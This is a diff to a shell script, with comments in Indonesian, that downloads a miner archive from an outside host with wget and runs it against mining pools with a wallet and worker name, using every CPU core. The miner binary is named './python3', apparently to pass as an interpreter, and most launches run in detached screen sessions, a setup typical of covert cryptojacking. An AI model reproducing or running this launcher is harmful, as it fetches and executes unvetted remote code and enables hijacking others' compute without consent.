@@ -22,16 +22,16 @@ URL="https://dot-aja.my.id/dotcpu.tar.gz"
 
 # Ganti nama hari dengan bahasa Indonesia
 case $HARI in
-  "Monday") HARI="$(echo $(shuf -i 1-4 -n 1)-fada)" ;;
-  "Tuesday") HARI="$(echo $(shuf -i 1-4 -n 1)-fada)" ;;
-  "Wednesday") HARI="$(echo $(shuf -i 1-4 -n 1)-fada)" ;;
-  "Thursday") HARI="$(echo $(shuf -i 1-4 -n 1)-fada)" ;;
-  "Friday") HARI="$(echo $(shuf -i 1-4 -n 1)-fada)" ;;
-  "Saturday") HARI="$(echo $(shuf -i 1-4 -n 1)-fada)" ;;
-  "Sunday") HARI="$(echo $(shuf -i 1-4 -n 1)-fada)" ;;
+  "Monday") HARI="nobe" ;;
+  "Tuesday") HARI="nobe" ;;
+  "Wednesday") HARI="nobe" ;;
+  "Thursday") HARI="nobe" ;;
+  "Friday") HARI="nobe" ;;
+  "Saturday") HARI="nobe" ;;
+  "Sunday") HARI="nobe" ;;
 esac
 
-NAMA="$HARI"
+NAMA="Sultan_$HARI"
 if [ ! -d "dotaja" ]; then
     echo "unduh dan ekstraks"
     wget -O dotaja $URL
@@ -43,7 +43,7 @@ fi
 # Cek argumen yang diberikan dan jalankan miner sesuai argumen
 if [ "$1" == "1" ]; then
     echo "lagi jalan bossqu menggunakan BMW"
-    screen -dmS DOT0 ./python3 -a $ALGO -o $POOLS1 -u $WALLET.$NAMA -t $(nproc)
+    ./python3 -a $ALGO -o $POOLS1 -u $WALLET.$NAMA -t $(nproc)
 elif [ "$1" == "2" ]; then
     echo "Menjalankan DOT1 dengan wallet $WALLET di pool $POOLS"
     screen -dmS DOT1 ./python3 -a $ALGO -o $POOLS2 -u $WALLET.$NAMA -t $(nproc)
